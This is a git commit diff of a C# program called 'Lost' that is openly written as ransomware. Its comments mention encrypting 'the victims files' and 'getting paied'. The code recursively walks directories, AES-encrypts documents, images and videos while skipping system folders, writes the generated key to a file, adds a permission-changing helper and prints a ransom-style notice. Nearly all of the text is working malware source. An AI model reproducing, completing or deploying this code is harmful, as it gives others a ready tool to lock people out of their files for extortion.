1671a59360e8418692a75c1dd0e07f47ef3fe073
danielohayon <danielohayon444@gmail.com>
2017-11-13 20:13:31 +0200

    working version of two programs. one encryptor and one decryptor. Now can also deal with multiple types of files

--- Lost/Program.cs
+++ Lost/Program.cs
@@ -2,38 +2,29 @@
 using System.Security.Cryptography;
 using System.IO;
 using System.Linq;
+using System.Collections.Generic;
+using System.Security.AccessControl;
 
 namespace Lost
 {
     class MainClass
     {
+        static List<string> targetExtensions = new List<string>(){".txt", ".jpg", ".png", ".pdf", ".mp4" };
+         //String key;
+        static List<string> foldersBlacklist = new List<string>() { "Windows", "Program Files", "Program Files (x86)", ".pdf", ".mp4" };
+
         public static void Main(string[] args)
         {
-            // Create the key
-            var aes = new AesCryptoServiceProvider();
-            aes.Key = Convert.FromBase64String(@"OoIsAwwF23cICQoLDA0ODe==");
-            aes.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
 
+            AesCryptoServiceProvider aes = createCipher();
             // Decide on base directory
-            string baseDirectory = "c://test";
+            string baseDirectory = "c:/test";
 
             // Encrypt the victims files 
             itterate(baseDirectory, aes, "encrypt");
 
             // getting paied
-            System.Console.WriteLine("Your feils have been encryptrd! to decrypt them enter the password:");
-            string password = System.Console.ReadLine();
-            while (password != "password")
-            {
-                System.Console.WriteLine("Wrong password!");
-                password = System.Console.ReadLine();
-            }
-
-            // Decrypting the victims files after getting paied 
-            itterate(baseDirectory, aes, "decrypt");
-            System.Console.WriteLine("Your feils have been decrypted :)");
-
-
+            System.Console.WriteLine("Your feils have been encryptrd!");
         }
 
 
@@ -41,8 +32,9 @@ namespace Lost
         public static void encryptFile(string filePath, AesCryptoServiceProvider aes)
         {
             var buffer = new byte[65536];
+            File.SetAttributes(filePath, FileAttributes.Normal);
 
-            using (var streamIn = new FileStream(filePath, FileMode.Open))
+            using (var streamIn = new FileStream(filePath, FileMode.Open,FileAccess.Read))
             using (var streamOut = new FileStream(filePath + ".enc", FileMode.Create))
             using (var encrypt = new CryptoStream(streamOut, aes.CreateEncryptor(), CryptoStreamMode.Write))
             {
@@ -61,11 +53,10 @@ namespace Lost
 
         public static void decryptFile(string filePath, AesCryptoServiceProvider aes)
         {
-
             //create new file name
             string origname = filePath.Remove(filePath.Length - 4);
             var buffer = new byte[65536];
-            using (var streamIn = new FileStream(filePath, FileMode.Open))
+            using (var streamIn = new FileStream(filePath, FileMode.Open,FileAccess.Read))
             using (var streamOut = new FileStream(origname, FileMode.Create))
             using (var decrypt = new CryptoStream(streamOut, aes.CreateDecryptor(), CryptoStreamMode.Write))
             {
@@ -82,17 +73,15 @@ namespace Lost
 
         }
 
-        public static void itterate(string cuurentDirectory, AesCryptoServiceProvider aes, string mod)
+        public static void itterate(string currentDirectory, AesCryptoServiceProvider aes, string mod)
         {
+            var allfiles = Directory.GetFiles(currentDirectory);
+            var currentFiles = allfiles.Where(fn => correctTargetExtension(Path.GetExtension(fn)));
 
-            var currentFiles = Directory.GetFiles(cuurentDirectory, "*.txt");
-            //var currentPictures = Directory.GetFiles(cuurentDirectory, "*.jpg");
-            //currentFiles = currentFiles.Union(currentPictures).Distinct().ToArray();
             if (mod == "decrypt")
-                currentFiles = Directory.GetFiles(cuurentDirectory, "*.enc");
+                currentFiles = Directory.GetFiles(currentDirectory, "*.enc");
             else if (mod != "encrypt")
                 throw new Exception();
-
 
 
             foreach (string filePath in currentFiles)
@@ -104,11 +93,55 @@ namespace Lost
                 else
                     throw new Exception();
             }
-            var currentDirectories = Directory.GetDirectories(cuurentDirectory);
+            var currentDirectories = Directory.GetDirectories(currentDirectory);
             foreach (string directory in currentDirectories)
             {
                 itterate(directory, aes, mod);
             }
+
+        }
+        public static void changeDirectoryPermissions(string path){
+            System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(path);
+            FileSystemAccessRule fsar = new FileSystemAccessRule(path, FileSystemRights.FullControl, AccessControlType.Allow);
+            DirectorySecurity ds = null;
+            ds = di.GetAccessControl();
+            ds.AddAccessRule(fsar);
+            di.SetAccessControl(ds); // nothing happens until you do this
+        }
+
+        public static bool correctTargetExtension(string fileExtension){
+            return targetExtensions.Exists(e => e == fileExtension);
+        }
+
+        public static AesCryptoServiceProvider createCipher(){
+            // Create the key
+            var aes = new AesCryptoServiceProvider();
+            aes.GenerateKey();
+            //aes.Key = Convert.FromBase64String(@"OoIsAwwF23cICQoLDA0ODe==");
+            //Console.WriteLine(System.Text.Encoding.Unicode.GetString(aes.Key));
+            Console.WriteLine(BitConverter.ToString(aes.Key));
+
+            using (var streamOut = new FileStream("c:/test/keyFile.key", FileMode.Create)){
+                BinaryWriter bin = new BinaryWriter(streamOut,new System.Text.UTF8Encoding());
+                bin.Write(aes.Key, 0, 32);
+
+                aes.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
+                bin.Close();
+            }
+            return aes;
+        }
+        public static AesCryptoServiceProvider getDecryptionCipher(){
+            var aes = new AesCryptoServiceProvider();
+
+            using (var streamIn = new FileStream("c:/test/keyFile.key", FileMode.Open, FileAccess.Read)){
+                BinaryReader bin = new BinaryReader(streamIn,new System.Text.UTF8Encoding());
+                aes.Key = bin.ReadBytes(32);
+                Console.WriteLine(BitConverter.ToString(aes.Key));
+                aes.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };  
+                bin.Close();
+            }
+
+            return aes;
 
         }
     }
